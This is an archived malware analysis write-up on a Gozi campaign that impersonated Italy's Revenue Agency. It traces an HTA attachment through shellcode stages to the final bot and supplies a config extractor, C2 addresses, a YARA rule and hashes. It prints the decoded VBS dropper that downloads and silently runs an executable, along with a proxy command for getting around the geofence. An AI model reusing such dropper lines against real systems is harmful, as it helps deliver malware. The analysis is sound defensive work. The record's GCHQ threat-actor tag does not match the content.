{
    "id": "a9a275d0-3e76-4c2b-bbdb-6538b2bfc89d",
    "created_at": "2023-04-05T02:09:15.495427Z",
    "updated_at": "2025-03-27T02:08:33.401266Z",
    "deleted_at": null,
    "sha1_hash": "f2b85bc8ccc79ec3bb92183591c07c6b47430c0d",
    "title": "2023-03-19 - Gozi - Italian ShellCode Dance",
    "authors": "",
    "file_creation_date": "2023-04-03T08:30:21Z",
    "file_modification_date": "2023-04-03T08:30:21Z",
    "file_size": 5688859,
    "plain_text": "# Gozi - Italian ShellCode Dance\n\n**0xtoxin-labs.gitbook.io/malware-analysis/malware-analysis/gozi-italian-shellcode-dance**\n\nIn this blogpost I will be going through a recent campaign targeting the Italian audience impersonates to The Italian Revenue Agency. Luring\nvictims to execute payload and become part of Gozi botnet.\n\n## The Phish\n\n[A massive malspam email campaign was spreading around the globe targeting italian individuals impersonating to Agenzia delle Entrate](https://www.agenziaentrate.gov.it/portale/)\nletting the users know that there is some problem with VAT and payment related documents:\n\n\n-----\n\nPhishing Mail\n\n**Translation:**\n\nDear Customer, from the examination of the data and payments relating to the Communication of periodic VAT eliminations, which you\npresented for the quarter 2023, some inconsistencies emerged. The notifications relating to the inconsistencies found are accessible in\nthe \"Tax box\" (the Agency section) accessible from the Revenue Agency website (www.agenziaentrate.gov.it) and in the complete\nversion in the archive attached to the current e-mail. This e-mail was created automatically, therefore we recommend that you do not\nreply to this e-mail address. Verification office, National Directorate of the Revenue Agency\n\nThe mail contains an attachment: AgenziaEntrate.hta which is part of the Social Engineering technique the threat actor tries to apply by\nletting the user know in the mail that he isn't suppose to reply back to the mail (as it's an automatically created mail) and the only choice left for\nthe user is to download and open the attachment.\n\n## Execution Chain\n\nBelow you can see a diagram of the execution chain from the moment the phishing mail was opened:\n\n\n-----\n\nExecution Flow\n\n## AgenziaEntrate.hta\n\nAs I've mentioned the email has an .hta attachment. the hta file contains inside of itself a few empty lines at the beginning and afterward a\nquite good amount of nonsense data:\n\nObfuscated HTA Content\n\nSo the first thing I've noticed is obfuscated code inside of script tags:\n\nScript Tag\n\nAfter cleaning the script a bit we can see clearly what happens here:\n\n\n-----\n\nPost Cleaning script\n\nThe script simply takes escaped string and unescaping it.\n\nBelow is a quick script that does the job, after unescaping the string a URL decode operation was required also to see clearly the output:\n\nimport urllib.parse\n\n​\n\nescapedStr =\n\"do\\143u\\155%65\\156t%2E\\167%72%69%74e%28%27%3C%27%2B%27%73%63\\162i\\160%74%20l\\141%6E\\147%75ag%65%3Dj\\163\\143%72\n\nunicodeDecodedStr = escapedStr.encode('utf-8').decode('unicode_escape')\n\nurlDecodedStr = urllib.parse.unquote(unicodeDecodedStr)\n\n​\n\nprint(urlDecodedStr)\n\ndocument.write('<'+'script language=jscript.encode>')\n\n## Jscript Encode\n\n[As we can see from the output, the content is encoded using jscript.encode and it can be decoded using this tool.\nAfter decoding the encoded](https://en.wikipedia.org/wiki/JScript.Encode)\ndata, the script will unescape a huge blob of data:\n\nDecoded Jscript.Encode Script\n\n[Using online tool such as CyberChef I've URL decoded the blob of data and at the first part of the data looked like obfuscated JS code, but](https://gchq.github.io/CyberChef/)\nwhen I've scrolled down I found out another script written in VBS:\n\n\n-----\n\nVbs Script\n\nWindow.ReSizeTo 0, 0\n\nWindow.MoveTo -4000, -4000\n\nset runn = CreateObject(\"WScript.Shell\")\n\ndim file\n\nfile = \"%systemroot%\\\\System32\\\\LogFiles\\\\\" & \"\\login.exe\"\n\nconst DontWaitUntilFinished = false, ShowWindow = 1, DontShowWindow = 0, WaitUntilFinished = true\n\nset oShell = CreateObject(\"WScript.Shell\")\n\noShell.Run \"cmd /c curl http://191.101.2.39/installazione.exe -o %systemroot%\\\\System32\\\\LogFiles\\\\login.exe \", DontShowWindow,\nWaitUntilFinished\n\nrunn.Run file,0\n\nClose\n\nClearly the script tries to download external payload and drop it to the user's disk at C:\\Windows\\System32\\LogFiles\\login.exe\n\n## Italy Geofence Bypass\n\nThe payload that the script tries to retrieve utilize the Curl command.\nI've tried to download the file and got the error: curl: (52) Empty\n```\nreply from server\n\n```\nFailed Payload Fetch\n\n[So after digging through the flags of Curl, I found the -x flag which allow access the URL through a proxy.\nSo I looked for HTTP proxies in Italy](https://curl.se/docs/manpage.html#-x)\n[(free-proxy.cz) And by executed the below command I've managed to retrieve the payload:](http://free-proxy.cz/en/proxylist/country/IT/http/ping/all)\n\ncurl -x 185.22.57.134:8080 http://191.101.2.39/installazione.exe -o C:\\Users\\igal\\Desktop\\AgenziaEntrate1.bin\n\nSuccessful Payload Fetch\n\n## Installazione.exe\n\nIn this part I will be covering the initial loader and going through some of it functionalities. I've opened the loader in IDA and the first thing that\ncaught my attention was the huge .data section:\n\nBig .data Section\n\n\n-----\n\nt s a good d cat o t at e e see g a pac ed b a y o go g t oug `a` t e e s a s g e ca to a u ct o be o e t e te at o o\nthe program:\n\nWinMain Function\n\n### sub_40471B\n\nThis function will be the actual main function of the loader, it will call the function mwDecryptWrapper_4041AE which will be the wrapper function\nfor the decryption routine and those will be the function arguments:\n\n1. 1.\n\nShellCode allocated memory\n\n2. 2.\n\nBlob1 Length\n\n3. 3.\n\nBlob3 Data\n\nCall To mwDecryptWrapper\n\nmwDecryptWrapper Function\n\nThe wrapper function will then call mwDecrypt_4040D8 and eventually the last function that will be called before sub_40471B ends will be\n```\nmwExecGoziShell_4042A6:\n\n```\nCall To mwExecGoziShell\n\nmwExecGoziShell Func\n\n\n-----\n\ne u ct o ju p to t e a ocated e o y t at t s data as p e ous y dec ypted\n\n### Dynamic Analysis\n\nLets see this in the dynamic view:\nDecryption Phase:\n\nDecryption Phase\n\n**Jump To ShellCode:**\n\n\n-----\n\nJump To ShellCode\n\n## 1st ShellCode\n\nNow that we've entered the 1st ShellCode, We can simply dump it and open it in IDA to further static analyze it before we dynamically finding\nour next interesting POI.\n\n### Dynamic API Resolve\n\nThe first thing the ShellCode will do is resolving API's it will need to further execute some function, it will be done by using a technique called\n**[PEB Walk and will combine inside of it hashes that simple google can help us to retrieve the hashes values, those are the API's that will be](https://www.ired.team/offensive-security/code-injection-process-injection/finding-kernel32-base-and-function-addresses-in-shellcode)**\nresolved:\n\nLoadLibraryA\n\nGetProcAddress\n\nGlobalAlloc\n\nGetLastError\n\nSleep\n\nVirtualAlloc\n\nCreateToolhelp32Snapshot\n\nModule32First\n\nCloseHandle\n\n\n-----\n\nDynamic Resolve API Function\n\n### resolveShellCode2_465\n\nThen In order to jump to the next stage ShellCode a new memory will be allocated using VirtualAlloc that was previously resolved and then\nthe next shell will be written in the freshly allocated memory (after decrypting it[decryptShellCode2_4F2]), and after that the function will jump\nto the ShellCode:\n\nJump To 2nd ShellCode Function\n\n## 2nd ShellCode\n\nSame as the first ShellCode, the second ShellCode will start by resolving API dynamically, those are the API's it will resolve:\n\nVirtualAlloc\n\n\n-----\n\ntua otect\n\nVirtualFree\n\nGetVersionExA\n\nTerminateProcess\n\nExitProcess\n\nSetErrorMode\n\nAfter the API's were resolved the ShellCode will use VirtualAlloc to create a new memory section (0x230000):\n\nVirtualAlloc Call\n\nThen a decryption loop will occur which will resolve and overwrite the freshly allocated memory with an executable binary:\n\nGozi Loader Writing Process\n\nAt this point I've dumped the binary and moved to analyze it.\n\n## Gozi Loader\n\n[I've tried to upload the binary to Tria ge and instantly got a result that they found it's Gozi binary statically:](https://tria.ge/dashboard)\n\n\n-----\n\nTria.ge Static Incrimination\n\nWhich made me a bit confused because I know that Gozi stores references to it's config below the section table (and there supposed to be 3\nconfig entries)\n\nConfig References In Gozi Binaries\n\nSo I've opened IDA and tried to look what's going on with this binary, it contains a small amount of function (about 30) and in the \"main\"\nfunction, it will simply hold a reference to another function and will use the API ExitProcess in order to execute this function:\n\nStart Function\n\n### APC Injection\n\nI was hovering over the function mwMainFunc_4019F1 and suddenly saw a call to the API QueueUserAPC\n\n\n-----\n\nQueueUserAPC API Call\n\nThe main thing we need to know about APC Injection is that the first argument passed to QueueUserAPC will be the malicious content that the\nexecuted thread will execute. (In this case the developers of Gozi used the API SleepEx in order to perform the injection)\nIn this case the first\npassed argument is actually a function pfnAPC_40139F which will decrypt the final Gozi payload and execute it using ExitThread\n\npfnAPC Function\n\n### Dynamic Analysis\n\nLets see this in the debugger:\n\n**APC Injection:**\n\n\n-----\n\nAPC Injection Procedure\n\n**Final Payload Decryption Routine:**\n\nFinal Payload Decryption Routine\n\nNow I can dump the final payload and see whether or not I can extract some configs out of it.\n\n## Gozi Binary\n\nI took a look below the section table and now we have 3 config entries as I would've expected:\n\n\n-----\n\nCo ect Co g e e e ce\n\n### Config Extraction\n\nI won't be going over Gozi's capability but what was interesting for me is extracting the configurations for it, so I've read about how Gozi\n[handles the configuration and how to work around it using SentinelOne blog about gozi and this was my final script:](https://www.sentinelone.com/labs/writing-malware-configuration-extractors-for-isfb-ursnif/)\n\nimport pefile\n\nimport re\n\nimport struct\n\nimport malduck\n\nimport binascii\n\n​\n\nFILE_PATH = '/Users/igal/malwares/gozi/01-03-23/8. final.bin'\n\n​\n\nFILE_DATA = open(FILE_PATH, 'rb').read()\n\n​\n\ndef locate_structs():\n\nstruct_list = []\n\n​\n\npe = pefile.PE(FILE_PATH)\n\n​\n\nnt_head = pe.DOS_HEADER.e_lfanew\n\nfile_head = nt_head + 4\n\nopt_head = file_head +18\n\nsize_of_opt_head = pe.FILE_HEADER.SizeOfOptionalHeader\n\ntext_section_table = opt_head + size_of_opt_head + 2\n\nnum_sections = pe.FILE_HEADER.NumberOfSections\n\nsize_of_section_table = 32 * (num_sections + 1)\n\nend_of_section_table = text_section_table + size_of_section_table\n\njj_struct_start = end_of_section_table + 48\n\nstructs = FILE_DATA[jj_struct_start:jj_struct_start + 60]\n\nreturn structs.split(b'JJ')[1:]\n\n​\n\ndef convertEndian(byteData):\n\nbig_endian_uint = struct.unpack('>I', byteData)[0]\n\nlittle_endian_uint = big_endian_uint.to_bytes(4, byteorder='little')\n\nreturn little_endian_uint.hex()\n\n​\n\ndef blobDataRetrieve(blobOff, blobLen):\n\n\n-----\n\npe pe e ( _ )\n\nconfigOff = pe.get_offset_from_rva(blobOff)\n\nblobData = FILE_DATA[configOff:configOff + blobLen].split(b'\\x00\\x00\\x00\\x00\\x00')[0]\n\nreturn blobData\n\ndef aplibDecryption(config_data):\n\nptxt_data = malduck.aplib.decompress(config_data)\n\n#print(ptxt_data)\n\nentry_data = []\n\nfor entry in ptxt_data.split(b\"\\x00\"):\n\nif len(entry) > 1:\n\nentry_data.append(entry.decode('ISO-8859-1'))\n\nreturn entry_data\n\n​\n\ndef decodeC2(dataArray):\n\nfor data in dataArray:\n\nif data.isascii() and len(data) > 20:\n\nc2List = data.split(' ')\n\nfor c2 in c2List:\n\nprint(f'\\t[+] {c2}')\n\n​\n\ndataStructs = locate_structs()\n\n​\n\nfor data in dataStructs:\n\ncrcHash = convertEndian(data[6:10])\n\nif crcHash == 'e1285e64': #RSA Key Hash\n\nblobOffset = int(convertEndian(data[10:14]), 16)\n\nconfigOff = pe.get_offset_from_rva(blobOffset)\n\nprint(f'[*] RSA Key at offset:{hex(configOff)}')\n\nif crcHash == '8fb1dde1': #Config Hash\n\nblobOffset = int(convertEndian(data[10:14]), 16)\n\nblobLength = int(convertEndian(data[14:18]), 16)\n\nblobData = blobDataRetrieve(blobOffset, blobLength)\n\ndecryptedData = aplibDecryption(blobData)\n\nprint('[*] C2 List:')\n\ndecodeC2(decryptedData)\n\nif crcHash == '68ebb983': #Wordlist Hash\n\nblobOffset = int(convertEndian(data[10:14]), 16)\n\n\n-----\n\nb ob e gt t(co e t d a (data[ 8]), 6)\n\nblobData = blobDataRetrieve(blobOffset, blobLength)\n\ndecryptedData = aplibDecryption(blobData)[0].split('\\r\\n')[1:-1]\n\nprint('[*] Wordlist:')\n\nfor word in decryptedData:\n\nprint(f'\\t[+] {word}')\n\n[*] RSA Key at offset:0xa800\n\n[*] C2 List:\n\n[+] checklist.skype.com\n\n[+] 62.173.141.252\n\n[+] 31.41.44.33\n\n[+] 109.248.11.112\n\n[*] Wordlist:\n\n[+] list\n\n[+] stop\n\n[+] computer\n\n[+] desktop\n\n[+] system\n\n[+] service\n\n[+] start\n\n[+] game\n\n[+] stop\n\n[+] operation\n\n[+] black\n\n[+] line\n\n[+] white\n\n[+] mode\n\n[+] link\n\n[+] urls\n\n[+] text\n\n[+] name\n\n[+] document\n\n[+] type\n\n[+] folder\n\n[+] mouse\n\n[+] file\n\n[+] paper\n\n\n-----\n\n[ ] a\n\n[+] check\n\n[+] mask\n\n[+] level\n\n[+] memory\n\n[+] chip\n\n[+] time\n\n[+] reply\n\n[+] date\n\n[+] mirrow\n\n[+] settings\n\n[+] collect\n\n[+] options\n\n[+] value\n\n[+] manager\n\n[+] page\n\n[+] control\n\n[+] thread\n\n[+] operator\n\n[+] byte\n\n[+] char\n\n[+] return\n\n[+] device\n\n[+] driver\n\n[+] tool\n\n[+] sheet\n\n[+] util\n\n[+] book\n\n[+] class\n\n[+] window\n\n[+] handler\n\n[+] pack\n\n[+] virtual\n\n[+] test\n\n[+] active\n\n[+] collision\n\n[+] process\n\n\n-----\n\n[ ] a e\n\n[+] local\n\n[+] core\n\n### Yara Rule\n\nThe below rule was created to hunt down unpacked binaries:\n\nimport \"pe\"\n\nrule Win_Gozi_JJ {\n\nmeta:\n\ndescription = \"Gozi JJ Structure binary rule\"\n\nauthor = \"0xToxin\"\n\nmalware_family = \"Gozi\"\n\ndate = \"15-03-23\"\n\nstrings:\n\n$fingerprint = \"JJ\" ascii\n\n$peCheck = \"This program cannot be run in DOS mode\" ascii\n\ncondition:\n\nall of them and #fingerprint >= 2 and for all i in (1..#fingerprint - 1): (@fingerprint[i] < 0x400 and @fingerprint[i] > 0x250 and @fingerprint[i + 1] @fingerprint[i] == 0x14)\n\n}\n\n[You can see the result of proactive hunt using unpac.me yara hunt](https://www.unpac.me/yara/results/9fbb4b2c-ecaf-40bc-bf8f-6c8162189021)\n\n## Summary\n\nIn this blogpost we went over a recent Gozi distribution campaign that was targeting the Italian audience.\nThe developers added some extra\nlayers of protection to insure the payloads are being opened by Italian only users and by this bypass AV's to identify the retrieved payload.\n\n## IOC's\n\n**Samples:**\n\n[AgenziaEntrate.hta - a3cec099b936e9f486de3b1492a81e55b17d5c2b06223f4256d49afc7bd212bc​](https://bazaar.abuse.ch/sample/a3cec099b936e9f486de3b1492a81e55b17d5c2b06223f4256d49afc7bd212bc)\n[AgenziaEntrate_decoded.js - c99f4de75e3c6fe98d6fbbcd0a7dbf45e8c7539ec8dc77ce86cea2cfaf822b6a​](https://bazaar.abuse.ch/sample/c99f4de75e3c6fe98d6fbbcd0a7dbf45e8c7539ec8dc77ce86cea2cfaf822b6a/)\n[installazione.exe - 9d1e71b94eab825c928377e93377feb62e02a85b7d750b883919207119a56e0d​](https://bazaar.abuse.ch/sample/9d1e71b94eab825c928377e93377feb62e02a85b7d750b883919207119a56e0d/)\n[shellcode1.bin - ebea18a2f0840080d033fb9eb3c54a91eb73f0138893e6c29eb7882bf74c1c30​](https://bazaar.abuse.ch/sample/ebea18a2f0840080d033fb9eb3c54a91eb73f0138893e6c29eb7882bf74c1c30/)\n[shellcode2.bin - df4f432719d32be6cc61598e9ca9a982dc0b6f093f8314c8557457729df3b37f​](https://bazaar.abuse.ch/sample/df4f432719d32be6cc61598e9ca9a982dc0b6f093f8314c8557457729df3b37f/)\ngozi loader.bin - [061c271c0617e56aeb196c834fcab2d24755afa50cd95cc6a299d76be496a858​](https://bazaar.abuse.ch/sample/061c271c0617e56aeb196c834fcab2d24755afa50cd95cc6a299d76be496a858/)\ngozi binary.bin - [876860a923754e2d2f6b1514d98f4914271e8cf60d3f95cf1f983e91baffa32b​](https://bazaar.abuse.ch/sample/876860a923754e2d2f6b1514d98f4914271e8cf60d3f95cf1f983e91baffa32b)\n**C2's:**\n\n62.173.141.252\n\n31.41.44.33\n\n109.248.11.112\n\n**Botnet: 7709**\n\n## References\n\nMalware Analysis - Previous\n\nScrubCrypt - The Rebirth of Jlaive\n\n\n-----\n\nast od ed d ago\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-03-19 - Gozi - Italian ShellCode Dance.pdf"
    ],
    "report_names": [
        "2023-03-19 - Gozi - Italian ShellCode Dance.pdf"
    ],
    "threat_actors": [
        {
            "id": "5d2bd376-fcdc-4c6a-bc2c-17ebbb5b81a4",
            "created_at": "2022-10-25T16:07:23.667223Z",
            "updated_at": "2025-03-27T02:02:09.916086Z",
            "deleted_at": null,
            "main_name": "GCHQ",
            "aliases": [
                "Government Communications Headquarters",
                "Operation Socialist"
            ],
            "source_name": "ETDA:GCHQ",
            "tools": [
                "Prax",
                "Regin",
                "WarriorPride"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1680660555,
    "ts_updated_at": 1743041313,
    "ts_creation_date": 1680510621,
    "ts_modification_date": 1680510621,
    "files": {
        "pdf": "https://archive.orkl.eu/f2b85bc8ccc79ec3bb92183591c07c6b47430c0d.pdf",
        "text": "https://archive.orkl.eu/f2b85bc8ccc79ec3bb92183591c07c6b47430c0d.txt",
        "img": "https://archive.orkl.eu/f2b85bc8ccc79ec3bb92183591c07c6b47430c0d.jpg"
    }
}